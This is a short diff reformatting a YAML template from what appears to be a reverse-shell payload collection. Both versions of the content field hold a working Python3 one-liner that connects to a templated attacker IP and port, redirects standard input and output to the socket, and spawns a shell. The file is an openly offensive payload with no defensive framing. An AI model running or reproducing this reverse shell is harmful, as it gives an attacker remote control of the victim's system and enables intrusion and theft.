@@ -1,11 +1,9 @@
+---
 metadata:
-  filename: revshell-linux-python3-short.yaml
-  tags:
-  - shell
-  - linux
-  created: '2025-03-29'
-  author: Unknown
-content: 'python3 -c ''import os,pty,socket;s=socket.socket();s.connect(("{{ attacker_ip
-  }}",{{ shell_port }}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")''
+  filename: "revshell-linux-python3-short.yaml"
+  tags: ["shell", "linux"]
+  created: "2025-03-29"
+  author: "Unknown"
 
-  '
+content: |
+  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{ attacker_ip }}",{{ shell_port }}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
